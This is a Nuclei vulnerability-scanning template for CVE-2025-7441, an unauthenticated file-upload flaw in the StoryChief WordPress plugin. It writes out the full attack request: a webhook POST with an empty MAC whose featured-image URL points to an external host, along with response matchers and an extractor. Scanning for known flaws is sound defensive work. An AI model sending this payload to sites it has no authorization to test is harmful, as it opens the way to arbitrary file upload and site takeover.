cat CVE-2025-7441.yaml
id: cve-2025-7441-storychief-arbitrary-file-upload

info:
  name: StoryChief Wordpress Plugin - Arbitrary File Upload (CVE-2025-7441)
  author: xpl0dec, adapted-for-nuclei-by-chatgpt
  severity: critical
  tags: wordpress, cve-2025, storychief, rce, upload
  description: |
    The StoryChief WordPress plugin up to and including 1.0.42 contains an unauthenticated webhook endpoint
    that can be abused to trigger remote image fetches which may result in arbitrary file uploads.
    This template sends a publish webhook payload that points the featured image to an external URL and
    detects the plugin response. The original PoC looks for "permalink" in the response body as an indicator
    of successful handling by the plugin.
  reference:
    - https://github.com/Story-Chief/wordpress/
    - 'https://nvd.nist.gov/vuln/detail/CVE-2025-7441'
  classification:
    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 9.8
    cve-id: CVE-2025-7441

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/storychief/webhook"
    headers:
      Content-Type: application/json
      User-Agent: nuclei-scanner
    body: |
      {
        "meta": {
          "mac": "",
          "event": "publish"
        },
        "data": {
          "featured_image": {
            "data": {
              "sizes": {
                "full": "http://example.com/storychief-test.jpg"
              }
            }
          }
        }
      }
    matchers:
      # primary indicator used by public PoC & exploit scripts
      - type: word
        part: body
        words:
          - "permalink"
      # some instances simply return 200 OK even without the text, include status fallback
      - type: status
        status:
          - 200
    # require both matchers? We consider response body match to be definitive.
    matchers-condition: and

    # optional extractors (useful if you want to capture returned permalink)
    extractors:
      - type: regex
        part: body
        regex:
          - '"permalink"\s*:\s*"([^"]+)"'
